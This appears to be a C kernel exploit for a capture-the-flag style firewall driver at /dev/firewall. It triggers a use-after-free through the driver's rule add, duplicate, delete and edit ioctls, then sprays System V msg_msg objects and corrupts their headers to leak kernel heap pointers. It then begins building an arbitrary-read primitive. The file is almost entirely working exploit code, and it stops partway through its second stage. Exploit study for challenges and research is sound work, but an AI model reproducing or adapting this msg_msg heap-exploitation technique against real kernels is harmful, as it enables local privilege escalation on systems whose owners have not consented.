#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netdb.h>

// IPC
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>


#define MSG_COPY	  (040000)

#define EXP_MSG       "\t[meow] "
#define EXP_WARN      "[W_A_R_N] "

#define EXP_NETMASK   "255.255.255.0"
#define EXP_IP        "127.0.0.1"
#define EXP_IFACE     "lo"
#define EXP_NAME      "cha2ned"
#define EXP_PROTO     8                   // TCP

#define NF_ACCEPT     1
#define NF_DROP       0

#define DEV_PATH      "/dev/firewall"

#define ADD_RULE      0x1337babe
#define DELETE_RULE   0xdeadbabe
#define EDIT_RULE     0x1337beef
#define SHOW_RULE     0xdeadbeef
#define DUP_RULE      0xbaad5aad
#define MAX_RULES     0x80
#define RULE_INBOUND  0x0
#define RULE_OUTBOUND 1

#define SPRAY_CNT     0x70
#define CORR_CNT      1
#define SPRAY_SZ      0x10
#define DUMP_CNT      40

#define MSG_TYP       0x1
#define MSG_TYP_NULL  0x0

#define MSG_SZ_NO_HDR 0xfd0
#define MAX_MSG_SZ    0xfd0+0x40

#define LEAK_MASK     0xffff000000000000

typedef unsigned char  uint8_t;
typedef unsigned short uint16_t;

int dfd;
char buf[MAX_MSG_SZ];

struct service_msg {
    long m_t;
    char mtext[MAX_MSG_SZ];
};

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];

    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
} user_rule_t;

// -*-*-*-*-*-*-*-*-*-* IPC primitives -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

int get_q() {
    int qid;

    if((qid=msgget(IPC_PRIVATE, 0666|IPC_CREAT)) < 0) {
        panic("failed to create queue");
    }

    return qid;
}

void send_msg(int q, char *buf, int sz, char flag) {
    int res;
    struct service_msg *msg = malloc(sizeof(struct service_msg));
    
    msg->m_t = MSG_TYP;

    memcpy(msg->mtext, buf, sz);
    memset(msg->mtext, flag, 0x10);

    if((res = msgsnd(q, msg, sz, 0)) < 0) {
        panic("failed to send message");
    }
}

// -*-*-*-*-*-*-*-*-*-* IOCTL interface -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

user_rule_t form_base_rule() {
    user_rule_t rule = {
        .iface   = EXP_IFACE,
        .name    = EXP_NAME,
        .ip      = EXP_IP,
        .netmask = EXP_NETMASK,

        .proto   = EXP_PROTO,
        .port    = 1337,
        .action  = NF_DROP,
        .type    = RULE_INBOUND,
    };

    return rule;
}

int firewall_ioctl(int cmd, user_rule_t *arg) {
    int res;

    if(arg->idx >= MAX_RULES) {
        puts("bad: idx >= MAX_RULES");
        return -1;
    }

    if(arg->type != RULE_INBOUND && arg->type != RULE_OUTBOUND) {
        puts("bad: rule type...");
        return -1;
    }

    if((res = ioctl(dfd, cmd, arg)) < 0) {
        return res;
    }
}

void firewall_add_rule(user_rule_t *rule) {
    firewall_ioctl(ADD_RULE, rule);
}

void firewall_dup_rule(user_rule_t *rule) {
    firewall_ioctl(DUP_RULE, rule);
}

void firewall_delete_rule(user_rule_t *rule) {
    firewall_ioctl(DELETE_RULE, rule);
}

void firewall_edit_rule(user_rule_t *rule) {
    firewall_ioctl(EDIT_RULE, rule);
}

// -*-*-*-*-*-*-*-*-*-* Exploit utils -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

void setup_buf(char *buf) {
    memset(buf, 'A', 0xfd0);
    memset(buf+0xfd0, 'B', 0x40);
}

void open_device() {
    dfd = open(DEV_PATH, O_RDWR);
    if(dfd < 0) {
        panic("failed to open device driver");
    }
}

void panic(char *msg) {
    printf("%s%s\n", EXP_MSG, msg);

    exit(-1);
}


void dump(void **ptr, int cnt) {
    for(int i = 0; i < cnt; i += 2) {
        printf("\t\t(%d)0x%016llx (%d)0x%016llx\n", i, ptr[i], i+1, ptr[i+1]);
    }
}

struct search_res {
    void *l;
    void *r;
};

int search(void **ptr, int cnt, struct search_res *res) {
    // Skip first four bytes as our own content
    ptr = ptr + 4;
    
    for(int i = 0; i < cnt; i += 1) {
        if(ptr[i] == (void *) 0x4242424242424242) {
            res->l = ptr[i-5];
            res->r = ptr[i-6];
            return 1;
        }
    }
    return 0;
}

void fallback(user_rule_t *rule) {
    puts(":c cleaning up");

    for(int idx = 0; idx < MAX_RULES; idx += 1) {
        rule->idx = idx;
        rule->type = RULE_INBOUND;
        firewall_delete_rule(rule);

        rule->type = RULE_OUTBOUND;
        firewall_delete_rule(rule);
    }
}

struct construct_res {
    char ip[16];
    char netmask[16];
};

struct construct_res *construct(u_int64_t addr) {
    u_int64_t lh, rh;
    
    lh = (addr >> 32);
    rh = (addr & 0xffffffff);

    struct construct_res *resp = malloc(sizeof(struct construct_res));
    memcpy(&resp->netmask, inet_ntoa(lh), 16);
    memcpy(&resp->ip, inet_ntoa(rh), 16);


   return resp;
}

int main() {
    int qid, res;
    int qid_second;

    // Open device
    open_device();

    // Create queues
    qid = get_q();
    qid_second = get_q();
    printf("Formed queues: q1=%d q2=%d\n", qid, qid_second);

    // Form message
    setup_buf(buf);
    
    
    // POC UAF

puts("Stage 1: getting the read primitive");

    user_rule_t rule = form_base_rule();
    

    printf(EXP_MSG "Creating & duplicating rules: cnt=%d\n", SPRAY_CNT);
    for(int idx = 0; idx < SPRAY_CNT; idx += 1) {
        rule.idx = idx;
        firewall_add_rule(&rule);   // inbound
        firewall_dup_rule(&rule);   // outbound!
    }

    printf(EXP_MSG "Deleting the inbound rules and spraying with messages... (size=%d)\n", SPRAY_SZ);
    for(int idx = 0; idx < SPRAY_CNT; idx += 1) {
        rule.idx = idx;
        firewall_delete_rule(&rule);

        if(idx < CORR_CNT)
            send_msg(qid, buf, SPRAY_SZ, 'A');
    }

    for(int idx = 0; idx < SPRAY_CNT-CORR_CNT; idx += 1) {
        send_msg(qid_second, buf, SPRAY_SZ, 'B');
    }


    puts(EXP_MSG "Corrupting metadata...");
    for(int idx = 0; idx < CORR_CNT; idx += 1) {
        rule.idx  = idx;
        rule.type = RULE_OUTBOUND;

        // setting linked pointers to zero for avoiding side-effects
        memset(rule.iface, '\x00', sizeof(rule.iface));
        memset(rule.name, '\x00', sizeof(rule.name));
        
        rule.name[0] = '\x01';
        rule.name[8] = '\xd0';
        // For future
        rule.name[9] = '\x0f';

        // Create incorrect IP for aborting zeroing correct addresses
        memset(rule.ip, 'A', sizeof(rule.ip));

        // Send the qbadass rule
        firewall_edit_rule(&rule);
    }

    struct search_res s_res;
    char tmp_buf[2*MSG_SZ_NO_HDR];

    printf(EXP_MSG "Searching for corrupted msg_msg (_sz=%d)\n", MSG_SZ_NO_HDR);
    for(int idx = 0; idx < SPRAY_CNT; idx += 1) {
        res = msgrcv(qid, &tmp_buf, MSG_SZ_NO_HDR, MSG_TYP_NULL, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
        if(res < 0) {
            panic("Some shit happened");
        }

        if(res > SPRAY_SZ) {
            if(search(tmp_buf, res/8, &s_res) == 1) {
                printf(EXP_MSG "[GOTCHA] Read: %d of %d bytes\n", res, SPRAY_SZ);
                dump(tmp_buf, 10);
                break;
            }            
        }
    }

    if (res == SPRAY_SZ || ((u_int64_t)s_res.l & LEAK_MASK) != LEAK_MASK) {
        fallback(&rule);

        panic("Failed to exploit, bruh");
    } 
    
    printf(EXP_MSG "LEAK: Real l=%p r=%p\n", s_res.l, s_res.r);

puts("Stage 2: Construct arbitrary read primitive");

    
    /*
    (maybe)
        L - адрес прошлого чанка
        R - адрес следующего чанка msg_msg (ДЛЯ Q2!!!!)
    */

    // Again corrupt msg_msg structs but with correct metadata 
    puts(EXP_MSG "Again corrupt msg_msg structs but with correct metadata");
    for(int idx = 0; idx < CORR_CNT; idx += 1) {
        // As prev
        rule.idx  = idx;
        rule.type = RULE_OUTBOUND;

        ((void **) &rule.iface)[0] = s_res.l;
        ((void **) &rule.iface)[1] = s_res.r;

        memset(rule.name, '\x00', sizeof(rule.name));
        
        // Now it'll read in two steps
        rule.name[0] = '\x01';
        rule.name[8] = '\x20';
        rule.name[9] = '\x00';


        // We should specify correct next address
        struct construct_res *net_data = construct((u_int64_t) s_res.r);
        memcpy(&rule.ip, net_data->ip, 16);
        memcpy(&rule.netmask, net_data->netmask, 16);

        firewall_edit_rule(&rule);
    }


    printf(EXP_MSG "Searching for corrupted msg_msg (_sz=%d)\n", MSG_SZ_NO_HDR);
    for(int idx = 0; idx < SPRAY_CNT; idx += 1) {
        res = msgrcv(qid, &tmp_buf, 2*MSG_SZ_NO_HDR, MSG_TYP_NULL, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
        if(res < 0) {
            panic("Some shit happened");
        }

        if(res > SPRAY_SZ) {
            printf("Size: %d\n", res);      
        }
    }

    return 0;
}